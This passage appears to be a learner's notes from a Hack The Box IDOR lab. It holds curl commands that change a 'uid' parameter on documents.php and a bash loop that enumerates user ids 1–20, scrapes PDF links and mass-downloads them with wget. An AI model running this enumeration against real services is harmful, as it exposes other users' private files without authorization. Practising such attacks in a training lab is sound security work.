...
```shell-session
Pangulin@htb[/htb]$ curl -s "http://SERVER_IP:PORT/documents.php?uid=1" | grep "<li class='pure-tree_link'>"
...
```shell-session
Pangulin@htb[/htb]$ curl -s "http://SERVER_IP:PORT/documents.php?uid=3" | grep -oP "\/documents.*?.pdf"
...
First, create a bash script file. For example, you can create a file named `script.sh` using a text editor like `nano`, `vim`, or `gedit`.
...
Copy your script content into `script.sh`:

sh

Code kopieren

`#!/bin/bash  url="http://94.237.49.212:39768"  for i in {1..20}; do     echo "Processing user id: $i"     document_links=$(curl -s "$url/documents.php?uid=$i" | grep -oP "/documents.*?.pdf")     echo "Found links: $document_links"          for link in $document_links; do         echo "Downloading $url/$link"         wget -q "$url/$link"     done done`

Save and close the file (in nano, you can do this by pressing `Ctrl + X`, then `Y`, and `Enter`).
...
Now you can run the script by specifying its path. If the script is in the current directory, you can use:
...
had to use POST curl to get it working 